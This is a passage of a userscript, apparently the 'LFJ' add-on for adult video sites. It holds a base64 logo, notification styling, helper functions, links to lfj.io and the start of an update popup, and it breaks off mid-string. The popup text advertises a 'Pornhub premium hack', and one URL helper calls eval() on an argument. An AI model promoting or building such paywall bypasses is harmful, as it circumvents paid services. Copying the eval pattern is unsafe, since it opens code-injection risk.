RW1PmdxL1FMqTZi4d0ec0++qXFeyl0QQfaTy24x9kVcBuxYhY9NBUT0GHcx0RcDlfmE8zkmXRd0lGa5nUnQYAgAX3i1ByMbLvmtOn9NGO6D9rkoTC0DOHdsmUzF9ApqMY+xj0bgwE+nfsSmUSgDZ6EIV+iGkD7XPerY3ow7ypNkB3jqLQs4DBq+lxh9DQDNFnVcjPJToFgGLrvIPT071N2E3ho0uir351SZL112HeX3/bRgeCES3AB4E3X1BamLm6sLycz5r3BwAJoWkDxLSBd4fnhenf8Y5Gz+AxM/+vO1yIOWBAkCUU0h6NKvJqa5XkacdRNIpYVczVRpxipjTeET0D54vzUVVRTxAghotWR1qgew0A4Nj1u+6CkhyqfxVbLGJMCQcPHv0n6ZY3/vj73qaGTRaAAHGzEJWbQDCvLfWvnzTeCUib4g2BIEIzYLFj+gDdACHJtWYWJASrCkCeR0iAsfQ8MfVraio3V5qHSq0dQG7zvoyXUdNoVQA4+oafzjcGBh+NhI5kmjgEgjJBQd79/ZNHdhuVJoAQmz2U6QIw/AP/K9WzNp8AwU7L+JkTSKaaFVAjQMo41qTbEghNHUULBFk2bL6upQxTBZNnMGS5PB8+dIwXgrIaS0ubmrBmUNcA+NpT+0caUvWeuuzyuxOjPZEkCr6lJat8H6G4NH95+fRU0m7JuLA1IMjEFIFxV9AlrhQsc8Xno2VWbIaAYVgIw0QQyyFSThhWJIHQoX+QWouqGCMcSFX3iSgAgFvsS90GTgKwlURdOJuasGVQ1wCwV9QFAHBw1/jjbrE0ZfgAuiYICjJXDnPu7Icf2JnZkbqwJdC+NvC+4BQrk6EHrY+40NtGzAkkgCB6amcSmy12bRYMPoO7uWLYe0Mb6E4rDOGDCKp/MBEGBjRXqwKSh79y+HBf1j06dQUAZiYhcucBgANg4YLN9yRVP2KOIRD6CjCLe6cmdgOddGJSG2QBoVHqnTRTxYg+WzFAaCai0JgfTeUjzmen/oH/WQh9MUgcmEjwE4aDglj2jUQaIBYNzldrAAC2lzc1YSWkrgDw5cMPbRDEoaNx8Kff8X0GrRhrAQMJG7kBn3STAUJ+efnCoYmnh4Ggk7JTaemODzKBUO8ZPhauCAqnhnX7mjbyCEWnPtIqRO3IP5Dxj6qcyP8H54jxF/IJMInlRr6UyplUEos1f7dQVpsymdeoKwBYzBv08/ne3kb17LPvBWBGAkDSIdT35/NiSICINjz+A80Z7Gw0NfMP5obOOm5601meNiJvXAA5eKGg8f5CSz6Q8A8SIAEg7OUSSIjEmoS4zRdxHhmct+b16kKrqIDFWg2B+0xk9X9t//6Wm1l2ZwIckdgS9uiun/omWJvN0ac2vQLvn9I0ASHUBr2nnt9lenaaWpXIGFZJ/zos97VBozK0IoV1JnQAEyMuDghP1eZUY9RzECy/vtZAMFnPcBQlUJL1SrTwFDCWswX9Ek9e+few0NPAJtDm6sbuM5A5t+XWvR0DYO++fTkGr4uXT21+/XR9cN0B0/an5AOgXdewYDn2OaOHHz4va9iExSlAaGkWipVjhioNnjycJIImDC8jJ9gZjWrVJqGaAKFd/0DY9UpSIyEmcO1cewdCFQqxCCDykGeWTQAwrLUHwCWVyoig5O+uSABTl155dzSlG8sLaGx5/2IJIgCjTz22O13QKaOpAyA08pXJSMCIRlogcCMM9MoEq5FIdEDihdWu/AOvNsFuOW0tgmEOoPMZAUJSYT7SlFbYwFxM+P4X1x4AhZJI9Y4B4Ild4wdlsfi8N4Gjj3wgSgbpq1v0XIFC79z09aQc8h7Jp2RPJrERozgQ6uW+2KQQxTRBcvWtIDmYJ9ef+E23P537B94fS9Vjr4QFn6E5gaT959BscaE052UUTWdnpp7YqAQkuP8zd92V8TZW9PidEVPTnyWb2XrhPcboT6wMCv9owPC8c+E46859/MFwR5FsRzAGhBb+wWJ5bDIMo/QVxJkgAEAkeuqz5uqgjGfuCAgSoOC18LjA42o/VP/Bf4ZTKIYmIEgtO7bm/WtEIDrn7LMHMhlDNwAQ3DTB8MibfuY+FqJqCF2394Hjp2uCkBjDzx6KpYbTw7vwIlr7B7ODG08xibqh/qF1eMCXDggQiu7SaHx+YbVAAICckOUo1KPIBAU8BZ2lmwC/QJX7E0mgM9XsPaPIcprKq2MACFDT6cZG34C9MLbxXsPWex8SNt8LbLVrIJTnz+ws1JaTK5VkVue38g+8tzukVTgeNauN/oS37fMlgIJqjISy7xAIWSThawDDzgfqPijTTJQBUEaj0p9IA59Jtf8e5SCayqsjAHxxYl+JObbFeQo9tevN93ghoS/YYA2pMS0cSxD5moGUqpxz4L7kBtRA2OvNgJDlH9j58jFjlJOmYsNogA2tkOf6KBCTfQoQUlltpg1c6cXnRrtBP1Ao7JA0ENQqQ/N6rXO1KpwmCxIdqdZOA1TmBtrKL5/acsmZat/wI2buHzDCQtLOw7UDAAgYmnpmt8rsWhhAyLoYmQUFSIVavncyvEUfXcFnBCtwIs2QU7bh8GpZhlWZhVzOzwIGvOgrfgK+9HOfmMQy5739jIM2zywuoBkRNTfZHQHA4vZ/JuX4pdvvNmSvLwmLTxSFQvDKi0tz20uLMxUFiVZAaNc/qBYGJg0whsLWs5NaqpgYFuRodnApMxeipHKjA0H5GiBU+boGiNn/wGcigIU1r3v+tVoNVcfJaNGnFr9z3BEAREG1vYr4yBvf/qRTLB4Pl4IZ9j8lMaQ9MDHnz3vkvp1Bb7YFBGSZBY+m+zYcB6DM5Aqbo0/DBECw4IxEADNrb7YQpaV/EOwMwslRHhXofUIAM1j4S8H8EHB6sfWGoSREU5l1BgDFHS0jn97kh4QAUp3A1IUj3oMPnfbeIdSpKRAy/QPvzM33N6SVnw7b1Ts4JIrKCSDwoFCNXKRpkrWnLUQxW06SFfz2sL7tW8iC1kH6pBoRpJWbDzio2TYWW41+r7qmL5F2BADK5TsCwBPjN9yvhFg2cgL6VLHOVmwauVBdunhgaiKRcgbQUhtk+QeuKB7zHgSm2Qn/Bw5h+BUaUEthLiAAQjpPWuOttAFrO4sYMb/PhmEGfFAyQ+ULYQh4oo3RH9C+ffsyp1c7AoCr2jcBANAYHLTnx87el0gMhYIO7tRDxlBL0DlH9l8frzOgzvwD7289V4kcQeNdO0MtGRqiqBYTmc92FqI08w+IEDmB8WVyoQnS+PD5lDkvCVS17da2X6dNmzLl1pkGaGUCUmo7uvst32T2tw2J530AmAkjGA/dPzu1q1mmD+jMP1jJ906a7cVCrcAua1SCPZLmAjZzQFv5B8SqEo0AirROImoyy9xcaR4ATs3FckEtpDhdra4NAJgTqbsMirrl1OaLZmoDww9plSB8yPibQzHKNWrnj008cXZ6gsek1v6BxExldNLQtRwbZQEvmlnIc8N/SUSvvRMgJP0DgiolHOI4hRqKQj7dQs/cXLWKejjh1gT4Gg26bqbcOgJATlBbv6kTp8ltO+4x1Hti2bh/Y3wRCRgbn348XC7WLhCyaKG4fkYB1VRtFApf44Xh5wKMDEBTIKTzFAEhr5bKAESCgfhUechD1PZKsW++Hc8/Tm6T30LqCADKdbsCwJHdbznkFEqTaesAQjLeJ0D4uXf+xC69y7MyfQafTbSBFIXJZPsMY9m6Rnm4I2lVJWMBvzwzLwEoAZRUvWz6PNpzG/0TByPjWdeab2/Mm7T8yCNrAwCm7jQAAJzatOUeszLtgfVUcUwdWtIdOf+p/RfG64syfegICA2rFDmCYaraYBk9sswAAA/9SURBVEzjT0GwPZrVTittkMaWgFOJJ0cNE2Q8fgQM5drVBQcdeH5BDczNftSyMw3QpQkAgIPjN92vhFhKqrgm9s9/22jkhSd3N9uJoxMg1KzKpLGdnS6IwDwFNpYBwTxgcSPfzPy0DQQF5KVdjtZKxF6o0ftFMVg6gL0C1BagXLvtn4TXqdWg7SwVTG0gMKwxNvL6+535Defs87iK+QPQzg117FHP/Oy1otFouu1Ou/7BcnHdsbAg/hoblAkE7wMNqtmRRBoowyxkAsEvtaRdMXyfuNlTEnAaQGMJ1KgCru05gGzFXH+/xhYSJDSXWWdOIBeTy046oMM73/JNVlKljvx4bkC7Ryi394JD37sCVnML2I5/cKIy+gIYMmrHF5QxKaWtXFKMslwZ1VtopXUS/oEVlQt2KwknGAxIB3BWwPUlwK37q6ujfnCsXFcaQICbyqwjAPReNrvUDRMBnXnd1tmVwZH9UYkvdP0VcyM0RAiC4ZMTfmq4yRBH7I40dW2VHRfWiWAL22jEa0cwS+3z1CNWRmK1tG4H6dogx3Y5BICU3ghvLAN2DZCuPy+lOYU+UB2R7woAYGoqs44AME7jrmJKrj3KrDUpqMlLr7rb6GydYulgHRDlhdkd+YW5ErLf2EtQloBskZ9MzEOE5kAi/qNYlmun7BgSVdqRf+DaFZY2YFe9IxztsWggdjSEvhq4PfUPAC6rtdMAAABLrUoLHL32zU/ZxbJmh82RHpXD6AAiKmw+/MNrkt5168AoLiA7XznmjfSY8JXGi9Z+TjZG9YxisvYW/oHmDOadlQq5DRibael+R4IP76hb5cz3AZsR56210wAAkGOxKgAAwKnztt5j7CYaTxDFU8P+se7MZDhDaAqjA20AYNEamDR3MvXbgYpAoe2Almd9w4isllL8g5RbSDoVY3e14NU51sqCSEQD44qfBu6UxLK7thpAsZxtr+XgQ7InnnzjOx6QwkdmSvIn2nhK8wcUo7CytK1/9nljlWs3QDhTWj9pdrTflowJxRdUTsqReCUtF6JY6ddJuRWj/hjY0kY/lMJKoXfe6M92JMcknYmJpsDpGACNqpvYPq3jOvr7nbmxs79rOAHxKMAo8wpJsdh05OHUGcJOgLBYGl5QTAumALQXW5UOAgViOVCAnVwLmWUWrBT/wD8TSlZ0cBlAVNpnhqEFZiujHZsAEmqmWRII6AIAe66/fk6pNjNSTbTAkWvHv8VMMjX0C18h102C939w9oXEQhGd2vUPHFHwZgYVIlMUV8eaQHrt6fQXYjSzkPQBdLPgFVrs9sbrzvzs/2fQSsMq2R2NfgBEYrrVPd28HMoCvGotcGbTRbMr/UP7E3Y/7Ty00UC+vrJ57PiRDem1etSONqhTaRJSRfP2SheABgLptd8nqyNNp5211pLNRtpASNmbELjSNIKKmQZmuEp0Zf8dS70oAAChdcXJFlJCwm077g7Vbijw4NDK9XPFOGfi8aZaQG8xCwgr+Z7JNHsPpXyhB+BwAKeBYmPOXyKeMtGU3Edak308LrT7oi31Y8LndBBIEvMdj34h1LrXL7ccqF0BQKHwQjffi9PRneNHnFLlOTP9imwz4B99c1O7s+pMozQgLJVHjqV2ulSAtMGNGtBYAew64NooynpsibiEsmSLbWF9xe8v4syTYwmpKmE7zUa+BhKXOs8CKoXT4zTecu6mKwDcsn37PIjbZ6qJFjix6cKU7WVSjsAMMGC59thZR364pVO+9dZPltefYKVcr24JuI4n8HoVaNRB0vW1gSeIgttI9QGyp56Tuqe4OD0IqcgEW1wbaIeviWzy9wToQFpk8UQ793W9SZRUfKz1XanfNM6e3PX2B5VlLWSaAcCMkeF13MbjR3ZVnTrsJq9hZbUuAahcUbpSvoB61RO6XQdc1xRGIBypkHMaI6mV+WSCwORJwVvHh+UzQ0a98XZ0LSAjQNii2JkGECQbKE62vnEVAHDnqhMdfSGjJbu3350d3fjdKA+vJWikSmoBPzTqX5q5LufUhaMcBEDoBAoSgI38MU89ZwklGqXCbaRvIK3Zl7g2UFKiatuYq1ZRdxz0OMtDRr3x9oIy1wREo1CY62j0M53Ys22b3c69XQNgz/j4shIdRgMZpuCp69/6LTC7yWgAMVOAUAsIx+nfevSRcLNpRzmoO3VUHbttMNQKlcl4Z5vCl1AKVYcKR1esnoeJFGWmg2V01G0b87Ua5up11LXVu73OygZP0DIdBCnCh1JYKfa0l3wL+qJN9Q90+3sBPllSHmXKZW4Y0ZwkAg9q5tzN88tDwz/uXZi9HkzRaCdf9ZMWNpEASAHCwoaTz+4+dMn1j5n1KjgKcJS/15iwkLcAK8VbWyyOTI6o5wEQS8rNuLnylJ0vT9WLvVPLpaGp2f6NU0vFkWgRHpvcA96P3krAA52UcLRtkuJUtFfOSsb52rmm9nUwTvduaP83Aplq8omnn2/39lUB4KbLd0587fEDlzNU+ztUCyC+tx0ATFxy1d2X3n/P9aGwg9WwiuH9mILmIQsAroPe2emr8ksLRadvoGHW5jUg/Y9ShWfejzX4vy1wfP2Wp5188eOnh8490cj3hXVYmauPpB/VecJWqp3MQERFt34WpIy0mQ4ClS58xagu9I+2Pf/CyjncKvun06r2CiYilooOdfzFFFPw7FVveNopV54xR4X/33YAuwHUqkB1CVhYAFaWQbVq6ZKD9+1o3pjSDq9FR0k4SmIBRfupoS0Tsyg2qo6N4Fis60cNi9UqFutVVOt11B1PrTsdCj+vXKvg1M+P/AoZqfzgXJrCh2I4VqGDn4hle3B77UgHbK0OAADgHDnyjGLVeo1AZstRN54893X3oFbzBL20CCwtAAtzQHUZqFYB2/bCNc1BXH/iuQ5yAqq7o+litPZo0/yzm0nKQih4xZG9D3wCpQDXBEIj1543DwDSlUfaif11WjUA9uzZIy3mw119OQaCJ9584w+k6yyg0YhCstisWHyypLQ0d9nAzFRb+xa8nDSyfPL1kP6Id31BxxzORIQgFeYrQ0fbqZ8JbqlvpmM5rBoAAFA/MnGYWqw9a82BhFOsyPlzLvh26qxY/FfKlIIL68zMhgvuVGRle16vEOqvzu0w4n0j7IuFojICyKnh89oCgJDyiRu23tBofadJq3ICA9qzZ4/8x8d++FAOuTd1VUHoGEocetON3/6p2z/9TijOgcjrEIgwImALTrVveP8Lr9t275Gr33yQrTw3r/zlp7HqieGivbwldZ5DKtMhDHIfiqGYFk6sv6Dlj0Qzy8VHrrirc18MawQAAPj5y699/quPP/I8szqnqwp8EMyet2lhed3Yj3pnp3fpwrfzxWMz52/dd3j3z96/tG5sZa34finodSeeGIdkMiIZPa+RMSW8Uu472E79dgM/3kt7u9KCawYAAKjPLDxUGO7b4G9K0Dn5IJjYcf3dl37zzl0KVnVx7JwHjl1x7b3HdrxhYi15famo3FgurVs49dYw/AOSIWAcGL4pmBk66+FW9UvmY3t27jzZLX9rCoA94+PL//TEw49ZzC1CsyYkgGeve/MzlcWFTx297i0HG/2DHb8O9UqinUe+8x7huH2J9Q5pgjdMgHKf2bT90WZ1K6a6u2I/1OyeVrQmTqBOt1664xALXt10sQCeePstBxr9fU7Wgo5XA13z1LffOrB05m1RzC+jIz4HEZT7uYFavufwcs9gLatuBjMX1AN7rr8+8552aM0BAACTk9MPMnH27oXtkECMu1cTCCR2Pf6Nd501/dwvhx5+XOgyBojYXMDM0NiDzVpQrjx468VXt58izqAXBQAfvOGGhtXAfcTclWNiUAIEr3wgXPv4PT83MjP58wmB62GeHhK62qEUWKnakxfv+kFW/Qx16tYrdz6Wdb0TelEAAAA3XX31GRJ4ZE0qS9UGr1wgVAu9J1NHuaEJpCH0MCPoSiz1Dj9Q743Pb3gkWdbsqns/SN9OrHt60QAAADdddvVhBXSXJUyjVwUQJI5tvPAwXJejbF+K0N14eZQJfO6Cbd9Nr5ttwYXvrNbu6/SiAgAA3nX5VQ+5Sk2saaWZQHi5wGC2v9Q3UnVE4bgpbDaFHs8I+kc9X37y2JYrJxJNsJKSG/fesn17dy+JZtCLDgAAePzOrz8IxR3MarVJCSAALx0YMtrxeaqW+w8ZIzw+0l2pzQRGZuC5LVf8Y7wlEkK5pO679Yrd7a/GbpNeEgDs3btXNa646nsdryBqlwTaAMNqQNGinpT25wZGDydsv6tN9khlgsKVqBcqB49etuspvWoGs4T80c9ffm3bizw6oZcEAACwh0g+emb5O5Kx6tClKWWCIaA0YbY6Om9n8tyLDkMqTkYAptD1689deKUx+hWzyufE/e+69Opn2u+AzuglAwAA7B0fdx/78tf2QayxT5BFIuN4CepYWLdxybHyLyQErmsCbep3qX/d949evjtczMFKuVzAvp+7ZEeXq6/bo5cUAIBnDm6+9Jr7Qe5Tre9+kShLqKsFS4xWKn2HwjUA8fcANGAoFgv733zz3wTfI0F1LvK31iLR04pecgAEdPNl1+5n6T5CQrzi5/K7pdnBsw4btl7GtIDvBB7fsu2vl4bOqgIAMy3mis4333XxzpmXgseXDQAAcMuV1z7pSvFtyXLN4tpXEr1w4aWHDGEbmsADxOLQyL2PvvGdXtZPqYnBucVv3LD12s63A+2SXlYAAMCtV1wxvTi3chdZL7Jz+DLQ7Mg5i47ITSWSQX6KuNo7uP++m//TF8BKwqIf3rz9mvvHxztb07daWtPp4G7pl8fH6wC++8+P/nibA7os7ZdJX61U6xs4lD99cqO+BwIrpc5s2nrHgzf++68xYTFH9ftu3PaGrvYAWi29kjqab7zimiccB3cxVMtlUK8Wmlvn+wGuBByXqz2DPzzwtn/z3x+4+Ze/TIXCgQOX3/X1Gy9/eYQPNPkpkZeb7jzwg01EhR0gLr/cvKyGhqeeG7z2n27/3YX1Zz14bPu19z9/4RUnADq+wNZDv3TFFaubMl8DesUCAAD+Yv/+/HCOLy1YYiu38XuFr3RSoFnh4tGbd+xY+7R4l/SKBkBAXzp4sFBxVy5UlnURKy693Px0SgxxSuXXZgHHWtOrAgABfYnZKj6+fwuAiwDxin4ZRDErQeIFUVRP3nTR1Wdebn6y6FUFAJ2+fOhHw3CsTYLp/FeKn8BgVoTTynUnpk7MTn7whs5f1Hip6VULgJCY6UtP/nisqPgchrUejEGKfhPupWDAZoHTFuMkGpi86eqrX1XvLLz6ARCjv9i/Pz+Uc9YL5NbnBIahRB8El9cCFExwCbwsBBaU5NMW6tM3Xv6GeRg7B7y66DUHgDT60pe+ZGHz5l6rIPuYrF6ACkJxjphzZCFHzDkWQigJN0fkMpHL0nUVkUsW1Vg2ltx1YmnPuWu3FOsn9BN6RdD/B1vkVIeL6ywlAAAAAElFTkSuQmCC';
GM_addStyle('.toastify { padding: 12px 20px; color: #ffffff; display: inline-block; box-shadow: 0 3px 6px -1px rgba(0, 0, 0, 0.12), 0 10px 36px -4px rgba(77, 96, 232, 0.3); background: -webkit-linear-gradient(315deg, #73a5ff, #5477f5); background: linear-gradient(135deg, #73a5ff, #5477f5); position: fixed; opacity: 0; transition: all 0.4s cubic-bezier(0.215, 0.61, 0.355, 1); border-radius: 2px; cursor: pointer; text-decoration: none; max-width: calc(50% - 20px); z-index: 2147483647; } .toastify.on { opacity: 1; } .toast-close { opacity: 0.4; padding: 0 5px; } .toastify-right { right: 15px; } .toastify-left { left: 15px; } .toastify-top { top: -150px; } .toastify-bottom { bottom: -150px; } .toastify-rounded { border-radius: 25px; } .toastify-avatar { width: 1.5em; height: 1.5em; margin: -7px 5px; border-radius: 2px; } .toastify-center { margin-left: auto; margin-right: auto; left: 0; right: 0; max-width: fit-content; max-width: -moz-fit-content; } @media only screen and (max-width: 360px) { .toastify-right, .toastify-left { margin-left: auto; margin-right: auto; left: 0; right: 0; max-width: fit-content; } } .toastify img{width:32px;height:32px;vertical-align:middle;}.toastify{font-size:16px;}.toastify.toastify-center.toastify-top{margin-top: 25%;}');

try{  _lfjlang=JSON.parse(JSON.parse(localStorage.getItem('_lang'))['val']);} catch(e){ console.log('nolong');};
function ldjnoti(txt,avt=false,uri,dur=3000,typec='#52993f, #16a767'){var des = {'text':txt,'duration':dur,'newWindow':true,'gravity': "bottom","position": "right","backgroundColor": "linear-gradient(to right, "+typec+")","stopOnFocus": false};if(uri){des['destination']=uri;} if(avt===true || avt !=='midno'){des['avatar']=ilfj_logo;} if(avt==='mid'){des['position']='center';des['gravity']='top';	};Toastify(des).showToast();}
;function rmldjnoti(){document.querySelectorAll('.toastify').forEach(e => e.parentNode.removeChild(e));};

new ClipboardJS('.buttoncopy');
var removehtml = s => (s + '').replace(/[&<>"']/g, m => ({ '&': '', '<': '', '>': '', '"': '', "'": '' })[m]);
function insertAfter(referenceNode, newNode) {referenceNode.parentNode.insertBefore(newNode, referenceNode.nextSibling);}

function gmclixclick_issuse(){GM_openInTab('https://lfj.io/#issue')}
function gmclixclick_tote(){GM_openInTab('https://lfj.io/')}
function gmclixclick_reinstall(){GM_openInTab('https://lfj.io/lfj.user.js')}
//function gmclixclick_settingprivacysites(){GM_openInTab('chrome://settings/content/siteDetails?site='+encodeURIComponent(location.origin))}
function gmclixclick_treview(){GM_openInTab('https://lfj.io/#feedback')}
function gmclixclick_donate(){GM_openInTab('https://lfj.io/#thank')}
function gmclixclick_mustupdate(){

  if (confirm('Maybe latest version will fixed your issue, you want to update?')) {
  localStorage.setItem('update_remind', parseInt(Math.floor(Date.now() / 1000))-42300);

  	getLink.appupdate();
  }
}

GM_registerMenuCommand('Offical site', gmclixclick_tote);
GM_registerMenuCommand('Sent a gift', gmclixclick_donate);


String.prototype.startWith = function (str) {
    return typeof this.indexOf === 'function' && this.indexOf(str) === 0;
};
String.prototype.ismatch = function (regex) {
    return typeof this.match === 'function' && this.match(regex) !== null;
};

//___________________________________________________________________________


    GM_addStyle('@font-face { font-family: \'Material Icons\'; font-style: normal; font-weight: 400; src: url(https://fonts.gstatic.com/s/materialicons/v55/flUhRq6tzZclQEJ-Vdg-IuiaDsNc.woff2) format(\'woff2\'); } .material-icons { font-family: \'Material Icons\'; font-weight: normal; font-style: normal; font-size: 24px; line-height: 1; letter-spacing: normal; text-transform: none; display: inline-block; white-space: nowrap; word-wrap: normal; direction: ltr; -webkit-font-feature-settings: \'liga\'; -webkit-font-smoothing: antialiased; } @-webkit-keyframes notyf-fadeinup{0%{opacity:0;transform:translateY(25%)}to{opacity:1;transform:translateY(0)}}@keyframes notyf-fadeinup{0%{opacity:0;transform:translateY(25%)}to{opacity:1;transform:translateY(0)}}@-webkit-keyframes notyf-fadeinleft{0%{opacity:0;transform:translateX(25%)}to{opacity:1;transform:translateX(0)}}@keyframes notyf-fadeinleft{0%{opacity:0;transform:translateX(25%)}to{opacity:1;transform:translateX(0)}}@-webkit-keyframes notyf-fadeoutright{0%{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(25%)}}@keyframes notyf-fadeoutright{0%{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(25%)}}@-webkit-keyframes notyf-fadeoutdown{0%{opacity:1;transform:translateY(0)}to{opacity:0;transform:translateY(25%)}}@keyframes notyf-fadeoutdown{0%{opacity:1;transform:translateY(0)}to{opacity:0;transform:translateY(25%)}}@-webkit-keyframes ripple{0%{transform:scale(0) translateY(-45%) translateX(13%)}to{transform:scale(1) translateY(-45%) translateX(13%)}}@keyframes ripple{0%{transform:scale(0) translateY(-45%) translateX(13%)}to{transform:scale(1) translateY(-45%) translateX(13%)}}.notyf{position:fixed;top:0;left:0;height:100%;width:100%;color:#fff;z-index:9999;display:flex;flex-direction:column;align-items:flex-end;justify-content:flex-end;pointer-events:none;box-sizing:border-box;padding:20px}.notyf__icon--error,.notyf__icon--success{height:21px;width:21px;background:#fff;border-radius:50%;display:block;margin:0 auto;position:relative}.notyf__icon--error:after,.notyf__icon--error:before{content:"";background:currentColor;display:block;position:absolute;width:3px;border-radius:3px;left:9px;height:12px;top:5px}.notyf__icon--error:after{transform:rotate(-45deg)}.notyf__icon--error:before{transform:rotate(45deg)}.notyf__icon--success:after,.notyf__icon--success:before{content:"";background:currentColor;display:block;position:absolute;width:3px;border-radius:3px}.notyf__icon--success:after{height:6px;transform:rotate(-45deg);top:9px;left:6px}.notyf__icon--success:before{height:11px;transform:rotate(45deg);top:5px;left:10px}.notyf__toast{display:block;overflow:hidden;pointer-events:auto;-webkit-animation:notyf-fadeinup .3s ease-in forwards;animation:notyf-fadeinup .3s ease-in forwards;box-shadow:0 3px 7px 0 rgba(0,0,0,.25);position:relative;padding:0 15px;border-radius:2px;max-width:300px;transform:translateY(25%);box-sizing:border-box;flex-shrink:0}.notyf__toast--disappear{transform:translateY(0);-webkit-animation:notyf-fadeoutdown .3s forwards;animation:notyf-fadeoutdown .3s forwards;-webkit-animation-delay:.25s;animation-delay:.25s}.notyf__toast--disappear .notyf__icon,.notyf__toast--disappear .notyf__message{-webkit-animation:notyf-fadeoutdown .3s forwards;animation:notyf-fadeoutdown .3s forwards;opacity:1;transform:translateY(0)}.notyf__toast--disappear .notyf__dismiss{-webkit-animation:notyf-fadeoutright .3s forwards;animation:notyf-fadeoutright .3s forwards;opacity:1;transform:translateX(0)}.notyf__toast--disappear .notyf__message{-webkit-animation-delay:.05s;animation-delay:.05s}.notyf__toast--upper{margin-bottom:20px}.notyf__toast--lower{margin-top:20px}.notyf__toast--dismissible .notyf__wrapper{padding-right:30px}.notyf__ripple{height:400px;width:400px;position:absolute;transform-origin:bottom right;right:0;top:0;border-radius:50%;transform:scale(0) translateY(-51%) translateX(13%);z-index:5;-webkit-animation:ripple .4s ease-out forwards;animation:ripple .4s ease-out forwards}.notyf__wrapper{display:flex;align-items:center;padding-top:17px;padding-bottom:17px;padding-right:15px;border-radius:3px;position:relative;z-index:10}.notyf__icon{width:22px;text-align:center;font-size:1.3em;opacity:0;-webkit-animation:notyf-fadeinup .3s forwards;animation:notyf-fadeinup .3s forwards;-webkit-animation-delay:.3s;animation-delay:.3s;margin-right:13px}.notyf__dismiss{position:absolute;top:0;right:0;height:100%;width:26px;margin-right:-15px;-webkit-animation:notyf-fadeinleft .3s forwards;animation:notyf-fadeinleft .3s forwards;-webkit-animation-delay:.35s;animation-delay:.35s;opacity:0}.notyf__dismiss-btn{background-color:rgba(0,0,0,.25);border:none;cursor:pointer;transition:opacity .2s ease,background-color .2s ease;outline:none;opacity:.35;height:100%;width:100%}.notyf__dismiss-btn:after,.notyf__dismiss-btn:before{content:"";background:#fff;height:12px;width:2px;border-radius:3px;position:absolute;left:calc(50% - 1px);top:calc(50% - 5px)}.notyf__dismiss-btn:after{transform:rotate(-45deg)}.notyf__dismiss-btn:before{transform:rotate(45deg)}.notyf__dismiss-btn:hover{opacity:.7;background-color:rgba(0,0,0,.15)}.notyf__dismiss-btn:active{opacity:.8}.notyf__message{vertical-align:middle;position:relative;opacity:0;-webkit-animation:notyf-fadeinup .3s forwards;animation:notyf-fadeinup .3s forwards;-webkit-animation-delay:.25s;animation-delay:.25s;line-height:1.5em}@media only screen and (max-width:480px){.notyf{padding:0}.notyf__ripple{height:600px;width:600px;-webkit-animation-duration:.5s;animation-duration:.5s}.notyf__toast{max-width:none;border-radius:0;box-shadow:0 -2px 7px 0 rgba(0,0,0,.13);width:100%}.notyf__dismiss{width:56px}}');
    const notyf = new Notyf({duration: 2300,position: {x: 'center',y: 'center',},types: [{type: 'warning',background: 'orange',icon: false}]});
    const hnotyf = new Notyf({duration: 3000,position: {x: 'right',y: 'bottom',},types: [{type: 'warning',background: 'orange',icon: false}]});
    var isFirefox = navigator.userAgent.toLowerCase().indexOf('firefox') > -1 || /Android|webOS|iPhone|iPad|iPod|Windows\sPhone|BlackBerry|IEMobile|Mobile\;|Opera Mini/i.test(navigator.userAgent);
    const hkparseUrl = (string, prop) =>  {const a =new URL(string);const {host, hostname, pathname, port, protocol, search, hash} = a;var mainhostname = `${hostname}`.split('.').slice(1).join(); const origin = `${protocol}//${hostname}${port.length ? `:${port}`:''}`;return prop ? eval(prop) : {origin, host, hostname, mainhostname, pathname, port, protocol, search, hash}}


  var popupWindow;
  function centeredPopup(url, winName, w, h, scroll) {
   var LeftPosition = (screen.width) ? (screen.width - w) / 2 : 0;
   var TopPosition = (screen.height) ? (screen.height - h) / 2 : 0;
   var  settings = 'height=' + h + ',width=' + w + ',top=' + TopPosition + ',left=' + LeftPosition + ',location=no,scrollbars=' + scroll + ',resizable'
    popupWindow = window.open(url, winName, settings)
}

function modulerequired(){
      $('#hoakhuyapop').remove();
      var nowversion='LFJ-basic';
      var newversion='LFJ-vanced';
      var newupdatetxt='<li>Pornhub premium hack; xvideos,porntrex,pornhub 2160p downloadable, 4horlover modded skin, thisav.com modded skin, custom filter and much more</li><li>By using LFJ vanced, you agree to enter into the "acceptable ads" program</li>';
      var updateurli='//lfj.io/lfj.user.js';
      var maxwidth = '45em !important';
      var h2fontsize = '22';
      if (window.location.href.match(/(xhamster\.)/i)) {  maxwidth = '34em !important';}
      else if(window.location.href.match(/(xvideos\.)/i)) {  maxwidth = '45em !important';h2fontsize = '22';}
      else if(window.location.href.match(/(pornhub\.)/i)) {  maxwidth = '40em !important';h2fontsize = '20';}
      else if(window.location.href.match(/(4horlover\.)/i)) {  maxwidth = '31em !important';h2fontsize = '20';}
      else if(window.location.href.match(/(tube8\.)/i)) {  maxwidth = '40em !important';h2fontsize = '20';}
      else if(window.location.href.match(/(xtube\.)/i)) {  maxwidth = '38em !important';}
      else if(window.location.href.match(/(thisav\.)/i)) {  maxwidth = '40em !important';h2fontsize = '20';}
      else if(window.location.href.match(/(porntrex\.)/i)) {  maxwidth = '40em !important';h2fontsize=23;}
      else if(window.location.href.match(/(modelhub\.)/i)) {  maxwidth = '31em !important';h2fontsize=23;}
    var htmccs='<style>.c5d8v2cd>li{list-style:unset} code>li{padding-top: 5px;}.hkoverlay { z-index:3210;position: fixed; top: 0; bottom: 0; left: 0; right: 0; background: rgba(0, 0, 0, 0.7); transition: opacity 500ms; visibility: visible; opacity: 1; }'+
    '.c5d8v2cd li{margin-bottom: 8px;}.hkoverlay:target { visibility: hidden; opacity: 0; } .hkpopup { margin: 70px auto !important; padding: 20px !important; padding-top: 10px; background: #fff; border-radius: 5px; width: 60%;text-align: left; max-width: '+maxwidth+'; position: relative; transition: all 1s ease-in-out; }'+
    '.hkpopup h2 { margin-top: 0; color: #333; font-family: Tahoma, Arial, sans-serif;text-transform: unset; }.hkbutton { display: inline-block; border-radius: 4px; background-color: #C60689; border: none; color: #FFFFFF; text-align: center; font-size: 16px; padding: 10px; width: fit-content; transition: all 0.5s; cursor: pointer; margin: 3px; } .hkbutton span { cursor: pointer; display: inline-block; position: relative; transition: 0.5s; } .hkbutton span:after { content: \'\\00bb\'; position: absolute; opacity: 0; top: 0; right: -20px; transition: 0.5s; } .hkbutton:hover span { padding-right: 10px; } .hkbutton:hover span:after { opacity: 1; right: 0; }'+
    '.hkpopup .hkclose { position: absolute; top: 4px; right: 13px; transition: all 200ms; font-size: 30px; font-weight: bold; text-decoration: none; color: #333; }'+
